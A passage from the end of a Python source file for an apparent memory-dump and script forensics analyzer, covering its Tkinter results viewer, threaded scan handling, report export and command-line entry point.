    vsb = ttk.Scrollbar(tree_frame, orient="vertical", command=tree.yview)
    tree.configure(yscrollcommand=vsb.set)
    tree.grid(row=0, column=0, sticky="nsew")
    vsb.grid(row=0, column=1, sticky="ns")
    for sev, col in SEV_COLORS.items():
        tree.tag_configure(sev, foreground=col)
    style.configure("Japan.Treeview", background=PANEL2, foreground=INK,
                    fieldbackground=PANEL2, rowheight=26, bordercolor=EDGE)
    style.map("Japan.Treeview", background=[("selected", TORII)],
              foreground=[("selected", "#ffffff")])
    style.configure("Japan.Treeview.Heading", background="#1b2438", foreground=GOLD,
                    relief="flat")
    style.map("Japan.Treeview.Heading", background=[("active", "#232f4a")])

    detail = tk.Text(panel, height=6, bg="#0d1322", fg=INK, relief="flat",
                     font=("Consolas", 9), wrap="word", insertbackground=INK,
                     selectbackground=EDGE)
    detail.grid(row=6, column=0, columnspan=3, sticky="ew", padx=16, pady=(0, 6))

    # ---------------- bottom bar ----------------
    bottom = tk.Frame(panel, bg=PANEL)
    bottom.grid(row=7, column=0, columnspan=3, sticky="ew", padx=16, pady=(0, 14))
    summary_var = tk.StringVar(value="")

    def refresh_view(*_):
        tree.delete(*tree.get_children())
        eng = engine_var.get()
        sev = sev_var.get()
        lvl = lvl_var.get()
        needle = search_var.get().lower()
        shown = 0
        for f in sorted(result["findings"], key=Finding.sort_key, reverse=True):
            if eng != "All" and f.engine != eng:
                continue
            if sev != "All" and f.severity != sev:
                continue
            if lvl != "All" and f.level_name != lvl:
                continue
            if needle and needle not in f.excerpt.lower() and needle not in f.detail.lower():
                continue
            lvl_txt = f"{f.level_name} {f.level_score}" if f.level_name else ""
            hits_txt = str(f.seen) if f.seen > 1 else ""
            tree.insert("", "end", values=(f.severity.upper(), f.engine, lvl_txt, hits_txt,
                                           hex(f.offset), f.excerpt), tags=(f.severity,))
            shown += 1
            if shown >= MAX_DISPLAY_ROWS:
                break

    engine_cb.bind("<<ComboboxSelected>>", refresh_view)
    sev_cb.bind("<<ComboboxSelected>>", refresh_view)
    lvl_cb.bind("<<ComboboxSelected>>", refresh_view)
    search_var.trace_add("write", lambda *_: refresh_view())

    def on_select(_evt):
        sel = tree.selection()
        if not sel:
            return
        vals = tree.item(sel[0], "values")
        detail.delete("1.0", "end")
        detail.insert("1.0", f"Offset {vals[4]}\n{vals[5]}\n\n")
        for f in result["findings"]:
            if f.excerpt == vals[5] and f.engine == vals[1]:
                detail.insert("end", f"engine={f.engine} severity={f.severity} "
                                     f"obfuscation={f.level_name} ({f.level_score}/100) "
                                     f"host={f.host} layer={f.layer} hits={f.seen}\ndetail: {f.detail}\n")
                break

    tree.bind("<<TreeviewSelect>>", on_select)

    def start_scan():
        if scanning["active"]:
            return
        path = path_var.get().strip()
        if not path or not os.path.isfile(path):
            messagebox.showerror(APP_NAME, "Select a valid dump or script file first.")
            return
        scanning["active"] = True
        result["findings"].clear()
        result["source"] = path
        refresh_view()
        status_var.set("Scanning... / 解析中")
        progress.configure(value=0)

        def worker():
            ctx = ScanContext()

            def pcb(done, total, nfind, _stats):
                q.put(("progress", done, total, nfind))

            scan_file(path, ctx, progress_cb=pcb, quiet=True, workers=DEFAULT_WORKERS)
            q.put(("done", ctx))

        threading.Thread(target=worker, daemon=True).start()

    def poll():
        try:
            while True:
                msg = q.get_nowait()
                if msg[0] == "progress":
                    _, done, total, nfind = msg
                    if total:
                        progress.configure(value=done * 100 / total)
                    status_var.set(f"Scanning... {done/(1024*1024):,.0f} MiB, {nfind} findings")
                elif msg[0] == "done":
                    ctx = msg[1]
                    result["findings"] = ctx.findings
                    scanning["active"] = False
                    crit = sum(1 for f in ctx.findings if f.severity == "critical")
                    high = sum(1 for f in ctx.findings if f.severity == "high")
                    summary_var.set(
                        f"{len(ctx.findings)} findings ({crit} critical, {high} high)"
                        + ("  [list truncated]" if ctx.truncated else ""))
                    status_var.set(summary_var.get())
                    refresh_view()
        except queue.Empty:
            pass
        root.after(120, poll)

    def ctx_for_export():
        c = ScanContext(max_findings=10**9, min_severity="info")
        c.findings = result["findings"]
        c.truncated = False
        return c

    def export(kind):
        if not result["findings"]:
            messagebox.showinfo(APP_NAME, "Nothing to export yet - run a scan first.")
            return
        ext = {"json": "json", "csv": "csv", "txt": "txt"}[kind]
        default = os.path.splitext(os.path.basename(result["source"]))[0] + f"_report.{ext}"
        p = filedialog.asksaveasfilename(defaultextension=f".{ext}", initialfile=default,
                                         filetypes=[(kind.upper(), f"*.{ext}")])
        if not p:
            return
        try:
            if kind == "json":
                write_json(ctx_for_export(), p, result["source"])
            elif kind == "csv":
                write_csv(ctx_for_export(), p)
            else:
                write_txt(ctx_for_export(), p, result["source"])
            status_var.set(f"Report written: {p}")
        except Exception as exc:  # noqa: BLE001
            messagebox.showerror(APP_NAME, f"Export failed: {exc}")

    jbutton(bar, "解析開始 Start Scan", start_scan).pack(side="right")
    for kind, label in (("txt", "TXT"), ("csv", "CSV"), ("json", "JSON")):
        jbutton(bottom, f"Export {label}", lambda k=kind: export(k),
                bgc="#233052", fgc=GOLD, pad=10).pack(side="right", padx=4)
    tk.Label(bottom, textvariable=summary_var, bg=PANEL, fg=SAKURA,
             font=("Segoe UI", 9, "bold")).pack(side="left")

    root.after(150, lambda: (draw_art(bg.winfo_width(), bg.winfo_height()), fit_panel()))
    root.after(120, poll)
    root.mainloop()

# ----------------------------------------------------------------------------
# CLI entry
# ----------------------------------------------------------------------------
def main(argv=None):
    import multiprocessing
    multiprocessing.freeze_support()  # required for frozen (PyInstaller) parallel scans
    # windowed (--noconsole) builds have no stdout/stderr; make writes safe
    if sys.stdout is None:
        sys.stdout = open(os.devnull, "w", encoding="utf-8")
    if sys.stderr is None:
        sys.stderr = open(os.devnull, "w", encoding="utf-8")

    argv = list(sys.argv[1:] if argv is None else argv)
    if not argv:
        hide_console()
        run_gui()
        return 0

    ap = argparse.ArgumentParser(prog=APP_NAME,
                                 description="Unified RAM dump / PowerShell / kernel dump analyzer")
    ap.add_argument("file", nargs="?", help="RAM dump, kernel dump or script/text file to scan")
    ap.add_argument("-o", "--json", dest="json_out", help="write JSON report")
    ap.add_argument("--csv", dest="csv_out", help="write CSV report")
    ap.add_argument("--txt", dest="txt_out", help="write TXT report")
    ap.add_argument("--min-severity", choices=list(SEV_ORDER), default="low")
    ap.add_argument("--max-findings", type=int, default=MAX_FINDINGS_DEFAULT)
    ap.add_argument("--threads", type=int, default=DEFAULT_WORKERS,
                    help=f"parallel scan workers (default {DEFAULT_WORKERS}; 1 = single-threaded)")
    ap.add_argument("--quiet", action="store_true")
    ap.add_argument("--selftest", action="store_true", help="run built-in detection self-test")
    args = ap.parse_args(argv)

    if args.selftest:
        return run_selftest(min_severity=args.min_severity)

    if not args.file:
        ap.error("provide a file to scan (or run without args for the GUI)")

    print(BANNER)
    if not os.path.isfile(args.file):
        print(f"  ERROR: file not found: {args.file}")
        return 2
    print(f"  target : {args.file} ({os.path.getsize(args.file):,} bytes)")
    print(f"  engines: obfuscated PS/CMD commands | download cradles | encoded payloads | "
          f"evasion | kernel artifacts | cheat indicators\n")

    ctx = ScanContext(max_findings=args.max_findings, min_severity=args.min_severity)
    scan_file(args.file, ctx, quiet=args.quiet, workers=max(1, args.threads))

    print(f"\n  total findings: {len(ctx.findings)}{' (truncated)' if ctx.truncated else ''}")
    counts = summary_counts(ctx)
    for k, v in counts.items():
        print(f"    {k:<44} {v}")

    if args.json_out:
        write_json(ctx, args.json_out, args.file)
        print(f"  JSON report: {args.json_out}")
    if args.csv_out:
        write_csv(ctx, args.csv_out)
        print(f"  CSV  report: {args.csv_out}")
    if args.txt_out:
        write_txt(ctx, args.txt_out, args.file)
        print(f"  TXT  report: {args.txt_out}")

    wrote_any = bool(args.json_out or args.csv_out or args.txt_out)
    if not wrote_any:
        # windowed-friendly fallback: always produce a report, then summarize in a dialog
        default_txt = os.path.splitext(args.file)[0] + "_JapanRAM_report.txt"
        try:
            write_txt(ctx, default_txt, args.file)
        except OSError:
            default_txt = os.path.join(os.path.expanduser("~"),
                                       os.path.basename(args.file) + "_JapanRAM_report.txt")
            write_txt(ctx, default_txt, args.file)
        print(f"  TXT  report: {default_txt}")
        try:
            import tkinter as tk
            from tkinter import messagebox
            r = tk.Tk()
            r.withdraw()
            counts = summary_counts(ctx)
            crit = sum(1 for f in ctx.findings if f.severity == "critical")
            high = sum(1 for f in ctx.findings if f.severity == "high")
            messagebox.showinfo(
                APP_NAME,
                f"Scan complete / 解析完了\n\n"
                f"File: {os.path.basename(args.file)}\n\n"
                f"Findings: {len(ctx.findings)}"
                f"  ({crit} critical, {high} high)\n\n"
                f"Report saved to:\n{default_txt}")
            r.destroy()
        except Exception:
            pass
    return 0
    if not (args.json_out or args.csv_out or args.txt_out):
        print("\n  top findings:")
        for f in sorted(ctx.findings, key=Finding.sort_key, reverse=True)[:25]:
            lvl = f" [{f.level_name} {f.level_score}/100]" if f.level_name else ""
            host = f" host={f.host}" if f.host else ""
            print(f"    {f.severity.upper():<8} {f.engine:<24}{lvl}{host} @ 0x{f.offset:X}  > {truncate(f.excerpt, 100)}")
    return 0


if __name__ == "__main__":
    import traceback
    import tempfile
    try:
        sys.exit(main())
    except SystemExit:
        raise
    except Exception:
        try:
            crash = os.path.join(tempfile.gettempdir(), "japan_ram_analyzer_crash.log")
            with open(crash, "a", encoding="utf-8") as fh:
                fh.write(f"\n[{datetime.now().isoformat()}] crash:\n{traceback.format_exc()}\n")
        except Exception:
            pass
        raise
